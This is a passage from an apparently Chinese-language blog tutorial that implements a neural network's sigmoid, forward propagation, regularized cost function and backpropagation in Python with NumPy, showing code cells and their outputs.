function），公式为： $g\left( z \right)=\frac{1}{1+{{e}^{-z}}}$<br>合起来，我们得到逻辑回归模型的假设函数：<br>    ${{h}_{\theta }}\left( x \right)=\frac{1}{1+{{e}^{-{{\theta }^{T}}X}}}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (<span class="number">1</span> + np.exp(-z))</span><br></pre></td></tr></table></figure><h2 id="前向传播函数"><a href="#前向传播函数" class="headerlink" title="前向传播函数"></a>前向传播函数</h2><blockquote><p>(400 + 1) -&gt; (25 + 1) -&gt; (10)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20706nn_model01.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m = X.shape[<span class="number">0</span>]</span><br><span class="line">np.insert(X,<span class="number">0</span>,values=np.ones(m),axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>array([[1., 0., 0., ..., 0., 0., 0.],       [1., 0., 0., ..., 0., 0., 0.],       [1., 0., 0., ..., 0., 0., 0.],       ...,       [1., 0., 0., ..., 0., 0., 0.],       [1., 0., 0., ..., 0., 0., 0.],       [1., 0., 0., ..., 0., 0., 0.]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward_propagate</span><span class="params">(X, theta1, theta2)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>] <span class="comment"># 行数</span></span><br><span class="line">    </span><br><span class="line">    a1 = np.insert(X, <span class="number">0</span>, values=np.ones(m), axis=<span class="number">1</span>) <span class="comment"># 0插入位置，np.ones(m) m维度，axis=1列的方向插入</span></span><br><span class="line">    z2 = a1 * theta1.T</span><br><span class="line">    a2 = np.insert(sigmoid(z2), <span class="number">0</span>, values=np.ones(m), axis=<span class="number">1</span>)</span><br><span class="line">    z3 = a2 * theta2.T</span><br><span class="line">    h = sigmoid(z3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> a1, z2, a2, z3, h</span><br></pre></td></tr></table></figure><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20706nn_cost04.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(params, input_size, hidden_size, num_labels, X, y, learning_rate)</span>:</span></span><br><span class="line">    <span class="comment"># 传入：神经网络参数，输入层维度，隐含层维度，标签数，训练数据，学习率</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>] <span class="comment"># 样本个数</span></span><br><span class="line">    X = np.matrix(X) <span class="comment"># 转换为numpy型矩阵</span></span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># reshape the parameter array into parameter matrices for each layer</span></span><br><span class="line">    <span class="comment"># 为每一层重塑参数数组为参数矩阵</span></span><br><span class="line">    <span class="comment">#从params中获取神经网络参数，并按照输入层维度和隐藏层维度重新定义参数的维度</span></span><br><span class="line">    theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + <span class="number">1</span>)], (hidden_size, (input_size + <span class="number">1</span>))))</span><br><span class="line">    theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + <span class="number">1</span>):], (num_labels, (hidden_size + <span class="number">1</span>))))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># run the feed-forward pass运行前向传播函数</span></span><br><span class="line">    <span class="comment"># 调用前面写好的前项传播函数</span></span><br><span class="line">    a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># compute the cost计算代价</span></span><br><span class="line">    J = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m): <span class="comment">#遍历每个样本</span></span><br><span class="line">        first_term = np.multiply(-y[i,:], np.log(h[i,:]))</span><br><span class="line">        second_term = np.multiply((<span class="number">1</span> - y[i,:]), np.log(<span class="number">1</span> - h[i,:]))</span><br><span class="line">        J += np.sum(first_term - second_term)</span><br><span class="line">    </span><br><span class="line">    J = J / m</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> J</span><br></pre></td></tr></table></figure><p>这个Sigmoid函数我们以前使用过。 前向传播函数计算给定当前参数的每个训练实例的假设。 它的输出形状应该与y的一个one-hot编码相同。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化设置</span></span><br><span class="line">input_size = <span class="number">400</span></span><br><span class="line">hidden_size = <span class="number">25</span></span><br><span class="line">num_labels = <span class="number">10</span></span><br><span class="line">learning_rate = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机初始化完整网络参数大小的参数数组</span></span><br><span class="line">params = (np.random.random(size=hidden_size * (input_size + <span class="number">1</span>) + num_labels * (hidden_size + <span class="number">1</span>)) - <span class="number">0.5</span>) * <span class="number">0.25</span></span><br><span class="line"></span><br><span class="line">m = X.shape[<span class="number">0</span>]</span><br><span class="line">X = np.matrix(X)</span><br><span class="line">y = np.matrix(y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将参数数组解开为每个层的参数矩阵（在不更改数组数据的情况下为数组提供新形状）</span></span><br><span class="line">theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + <span class="number">1</span>)], (hidden_size, (input_size + <span class="number">1</span>))))</span><br><span class="line">theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + <span class="number">1</span>):], (num_labels, (hidden_size + <span class="number">1</span>))))</span><br><span class="line"></span><br><span class="line">theta1.shape, theta2.shape</span><br></pre></td></tr></table></figure><pre><code>((25, 401), (10, 26))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)</span><br><span class="line">a1.shape, z2.shape, a2.shape, z3.shape, h.shape</span><br></pre></td></tr></table></figure><pre><code>((5000, 401), (5000, 25), (5000, 26), (5000, 10), (5000, 10))</code></pre><p>代价函数在计算假设矩阵h之后，应用代价函数来计算y和h之间的总误差。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cost(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate)</span><br></pre></td></tr></table></figure><pre><code>7.182002885834476</code></pre><ul><li>整合上述代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward_propagate</span><span class="params">(X,theta1,theta2)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a1 5000*401  theta1.T(25*401).T  = z1 5000*25 </span></span><br><span class="line">    <span class="comment"># a2 5000*26  theta2.T(10*26).T    =5000*10 </span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    a1 = np.insert(X, <span class="number">0</span>, values=np.ones(m), axis=<span class="number">1</span>)</span><br><span class="line">    z2 = a1* theta1.T</span><br><span class="line">    a2 = np.insert(sigmoid(z2),<span class="number">0</span>,values=np.ones(m),axis=<span class="number">1</span>)</span><br><span class="line">    z3 = a2 * theta2.T</span><br><span class="line">    h = sigmoid(z3)</span><br><span class="line">    <span class="keyword">return</span> a1,z2,a2,z3,h</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(params, input_size,hidden_size,num_lables,X,y,learning_rate)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    theta1 = np.matrix(np.reshape(params[:hidden_size*(input_size+<span class="number">1</span>)],(hidden_size,input_size+<span class="number">1</span>)))</span><br><span class="line">    theta2 = np.matrix(np.reshape(params[hidden_size*(input_size+<span class="number">1</span>):],(num_lables,hidden_size+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">    a1,z2,a2,z3,h = forward_propagate(X,theta1,theta2)</span><br><span class="line">    </span><br><span class="line">    J=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line"></span><br><span class="line">        first_term = np.multiply(-y[i,:], np.log(h[i,:]))</span><br><span class="line">        second_term = np.multiply((<span class="number">1</span> - y[i,:]), np.log(<span class="number">1</span> - h[i,:]))</span><br><span class="line">        J += np.sum(first_term - second_term)</span><br><span class="line"></span><br><span class="line">    J = J / m</span><br><span class="line">    <span class="keyword">return</span> J</span><br><span class="line">input_size= <span class="number">400</span></span><br><span class="line">hidden_size= <span class="number">25</span></span><br><span class="line">num_labels= <span class="number">10</span></span><br><span class="line">learning_rate =<span class="number">1</span></span><br><span class="line"></span><br><span class="line">params = (np.random.random(size=hidden_size * (input_size + <span class="number">1</span>) + num_labels * (hidden_size + <span class="number">1</span>)) - <span class="number">0.5</span>) * <span class="number">0.25</span></span><br><span class="line"></span><br><span class="line">cost(params,input_size,hidden_size,num_labels,X,y_onehot,learning_rate)</span><br></pre></td></tr></table></figure><pre><code>7.132323728323127</code></pre><h2 id="正则化代价函数"><a href="#正则化代价函数" class="headerlink" title="正则化代价函数"></a>正则化代价函数</h2><p>我们的下一步是增加代价函数的正则化。  它实际上并不像看起来那么复杂 - 事实上，正则化术语只是我们已经计算出的代价的一个补充。 下面是修改后的代价函数。<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20706nn_regcost03.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(params, input_size, hidden_size, num_labels, X, y, learning_rate)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># reshape the parameter array into parameter matrices for each layer</span></span><br><span class="line">    theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + <span class="number">1</span>)], (hidden_size, (input_size + <span class="number">1</span>))))</span><br><span class="line">    theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + <span class="number">1</span>):], (num_labels, (hidden_size + <span class="number">1</span>))))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># run the feed-forward pass</span></span><br><span class="line">    a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># compute the cost</span></span><br><span class="line">    J = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        first_term = np.multiply(-y[i,:], np.log(h[i,:]))</span><br><span class="line">        second_term = np.multiply((<span class="number">1</span> - y[i,:]), np.log(<span class="number">1</span> - h[i,:]))</span><br><span class="line">        J += np.sum(first_term - second_term)</span><br><span class="line">    </span><br><span class="line">    J = J/m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add the cost regularization term</span></span><br><span class="line">    J += (float(learning_rate) / (<span class="number">2</span> * m)) * (np.sum(np.power(theta1[:,<span class="number">1</span>:], <span class="number">2</span>)) + np.sum(np.power(theta2[:,<span class="number">1</span>:], <span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> J</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cost(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate)</span><br></pre></td></tr></table></figure><pre><code>7.137673923569304</code></pre><h2 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h2><p>接下来是反向传播算法。 反向传播参数更新计算将减少训练数据上的神经网络误差。 我们需要的第一件事是计算我们之前创建的Sigmoid函数的梯度的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_gradient</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> np.multiply(sigmoid(z), (<span class="number">1</span> - sigmoid(z)))</span><br></pre></td></tr></table></figure><p>现在我们准备好实施反向传播来计算梯度。 由于反向传播所需的计算是代价函数中所需的计算过程，我们实际上将扩展代价函数以执行反向传播并返回代价和梯度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backprop</span><span class="params">(params, input_size, hidden_size, num_labels, X, y, learning_rate)</span>:</span></span><br><span class="line">    <span class="comment"># 步骤一：获取样本个数</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤二：将矩阵X,y转换为numpy型矩阵</span></span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤三：从params中获取神经网络参数，并按照输入层维度和隐含层维度重新定义参数的维度</span></span><br><span class="line">    <span class="comment"># reshape the parameter array into parameter matrices for each layer</span></span><br><span class="line">    theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + <span class="number">1</span>)], (hidden_size, (input_size + <span class="number">1</span>))))</span><br><span class="line">    theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + <span class="number">1</span>):], (num_labels, (hidden_size + <span class="number">1</span>))))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤四：调用前面写好的前向传播函数</span></span><br><span class="line">    <span class="comment"># run the feed-forward pass</span></span><br><span class="line">    a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤五：初始化</span></span><br><span class="line">    <span class="comment"># initializations</span></span><br><span class="line">    </span><br><span class="line">    J = <span class="number">0</span></span><br><span class="line">    delta1 = np.zeros(theta1.shape)  <span class="comment"># (25, 401)</span></span><br><span class="line">    delta2 = np.zeros(theta2.shape)  <span class="comment"># (10, 26)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤六：计算代价函数</span></span><br><span class="line">    <span class="comment"># compute the cost</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        first_term = np.multiply(-y[i,:], np.log(h[i,:]))</span><br><span class="line">        second_term = np.multiply((<span class="number">1</span> - y[i,:]), np.log(<span class="number">1</span> - h[i,:]))</span><br><span class="line">        J += np.sum(first_term - second_term)</span><br><span class="line">    </span><br><span class="line">    J = J / m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤七：正则化</span></span><br><span class="line">    <span class="comment"># add the cost regularization term</span></span><br><span class="line">    J += (float(learning_rate) / (<span class="number">2</span> * m)) * (np.sum(np.power(theta1[:,<span class="number">1</span>:], <span class="number">2</span>)) + np.sum(np.power(theta2[:,<span class="number">1</span>:], <span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤八：实现反向传播</span></span><br><span class="line">    <span class="comment"># perform backpropagation执行反向传播</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># a1 （5000,401），theta1 （25,401）,theta2 (10,26)</span></span><br><span class="line">    <span class="comment"># z2= （5000,401）*（25，401）.T=(5000,25) , a2 = (5000,26)</span></span><br><span class="line">    <span class="comment"># z3 =(5000,26)*(10,26).T= (5000,10)   a3 = h = (5000,10)</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(m):</span><br><span class="line">        a1t = a1[t,:]  <span class="comment"># (1, 401)</span></span><br><span class="line">        z2t = z2[t,:]  <span class="comment"># (1, 25)</span></span><br><span class="line">        a2t = a2[t,:]  <span class="comment"># (1, 26)</span></span><br><span class="line">        ht = h[t,:]  <span class="comment"># (1, 10)</span></span><br><span class="line">        yt = y[t,:]  <span class="comment"># (1, 10)</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        d3t = ht - yt  <span class="comment"># (1, 10)</span></span><br><span class="line">        <span class="comment"># theta2 （10,26）</span></span><br><span class="line">        z2t = np.insert(z2t, <span class="number">0</span>, values=np.ones(<span class="number">1</span>))  <span class="comment"># (1, 26)</span></span><br><span class="line">        <span class="comment"># sigmoid_gradient(z2t) （1,26）</span></span><br><span class="line">        <span class="comment"># (theta2.T (26,10) d3t（1,10）.T ).T= (26,1).T = (1,26)</span></span><br><span class="line">        d2t = np.multiply((theta2.T * d3t.T).T, sigmoid_gradient(z2t))  <span class="comment"># (1, 26)</span></span><br><span class="line">        </span><br><span class="line">        delta1 = delta1 + (d2t[:,<span class="number">1</span>:]).T * a1t  <span class="comment"># 输入层到隐含层的误差</span></span><br><span class="line">        delta2 = delta2 + d3t.T * a2t     <span class="comment"># 隐含层到输出层的误差</span></span><br><span class="line">        </span><br><span class="line">    delta1 = delta1 / m</span><br><span class="line">    delta2 = delta2 / m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤九：将梯度矩阵转换为单个数组</span></span><br><span class="line">    <span class="comment"># unravel the gradient matrices into a single array</span></span><br><span class="line">    grad = np.concatenate((np.ravel(delta1), np.ravel(delta2)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> J, grad</span><br></pre></td></tr></table></figure><ul><li>梯度矩阵转换为单个数组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">b = np.array([[<span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">print(<span class="string">"111:"</span>,np.ravel(a))</span><br><span class="line">print(<span class="string">"222:"</span>,np.concatenate((a,b))) <span class="comment"># 默认axis=0</span></span><br><span class="line">print(<span class="string">"ddd:"</span>,np.concatenate((a, b.T), axis=<span class="number">1</span>))</span><br><span class="line">print(<span class="string">"--------"</span>)</span><br><span class="line">np.concatenate((np.ravel(a),np.ravel(b)))</span><br></pre></td></tr></table></figure><pre><code>111: [1 2 3 4]222: [[1 2] [3 4] [5 6]]ddd: [[1 2 5] [3 4 6]]--------array([1, 2, 3, 4, 5, 6])</code></pre><p>反向传播计算的最难的部分（除了理解为什么我们正在做所有这些计算）是获得正确矩阵维度。 顺便说一下，你容易混淆了A * B与np.multiply（A，B）使用。 基本上前者是矩阵乘法，后者是元素乘法（除非A或B是标量值，在这种情况下没关系）。<br>无论如何，让我们测试一下，以确保函数返回我们期望的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">J, grad = backprop(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate)</span><br><span class="line">J, grad.shape</span><br></pre></td></tr></table></figure><pre><code>(7.137673923569304, (10285,))</code></pre><h3 id="矩阵乘法和元素乘法"><a href="#矩阵乘法和元素乘法" class="headerlink" title="矩阵乘法和元素乘法"></a>矩阵乘法和元素乘法</h3><ul><li>矩阵乘法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = np.matrix(np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>]])) <span class="comment"># numpy型矩阵</span></span><br><span class="line">b = np.matrix(np.array([[<span class="number">2</span>],[<span class="number">3</span>],[<span class="number">4</span>],[<span class="number">5</span>]]))</span><br><span class="line"></span><br><span class="line">print(a.shape,b.shape)</span><br><span class="line">print(a*b)</span><br><span class="line">print(np.dot(a,b))</span><br></pre></td></tr></table></figure><pre><code>(1, 4) (4, 1)[[35]][[35]]</code></pre><ul><li>元素乘法示例</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = np.matrix(np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>]]))</span><br><span class="line">b = np.matrix(np.array([[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>]]))</span><br><span class="line"></span><br><span class="line">np.multiply(b,a)</span><br></pre></td></tr></table></figure><pre><code>matrix([[ 2,  8, 18, 24]])</code></pre><h3 id="反向传播正则化"><a href="#反向传播正则化" class="headerlink" title="反向传播正则化"></a>反向传播正则化</h3><p> 我们还需要对反向传播函数进行一个修改，即将梯度计算加正则化。 最后的正式版本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backprop</span><span class="params">(params, input_size, hidden_size, num_labels, X, y, learning_rate)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># reshape the parameter array into parameter matrices for each layer</span></span><br><span class="line">    theta1 = np.matrix(np.reshape(params[:hidden_size * (input_size + <span class="number">1</span>)], (hidden_size, (input_size + <span class="number">1</span>))))</span><br><span class="line">    theta2 = np.matrix(np.reshape(params[hidden_size * (input_size + <span class="number">1</span>):], (num_labels, (hidden_size + <span class="number">1</span>))))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># run the feed-forward pass</span></span><br><span class="line">    a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># initializations</span></span><br><span class="line">    J = <span class="number">0</span></span><br><span class="line">    delta1 = np.zeros(theta1.shape)  <span class="comment"># (25, 401)</span></span><br><span class="line">    delta2 = np.zeros(theta2.shape)  <span class="comment"># (10, 26)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># compute the cost</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        first_term = np.multiply(-y[i,:], np.log(h[i,:]))</span><br><span class="line">        second_term = np.multiply((<span class="number">1</span> - y[i,:]), np.log(<span class="number">1</span> - h[i,:]))</span><br><span class="line">        J += np.sum(first_term - second_term)</span><br><span class="line">    </span><br><span class="line">    J = J / m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add the cost regularization term</span></span><br><span class="line">    J += (float(learning_rate) / (<span class="number">2</span> * m)) * (np.sum(np.power(theta1[:,<span class="number">1</span>:], <span class="number">2</span>)) + np.sum(np.power(theta2[:,<span class="number">1</span>:], <span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># perform backpropagation</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(m):</span><br><span class="line">        a1t = a1[t,:]  <span class="comment"># (1, 401)</span></span><br><span class="line">        z2t = z2[t,:]  <span class="comment"># (1, 25)</span></span><br><span class="line">        a2t = a2[t,:]  <span class="comment"># (1, 26)</span></span><br><span class="line">        ht = h[t,:]  <span class="comment"># (1, 10)</span></span><br><span class="line">        yt = y[t,:]  <span class="comment"># (1, 10)</span></span><br><span class="line">        </span><br><span class="line">        d3t = ht - yt  <span class="comment"># (1, 10)</span></span><br><span class="line">        </span><br><span class="line">        z2t = np.insert(z2t, <span class="number">0</span>, values=np.ones(<span class="number">1</span>))  <span class="comment"># (1, 26)</span></span><br><span class="line">        d2t = np.multiply((theta2.T * 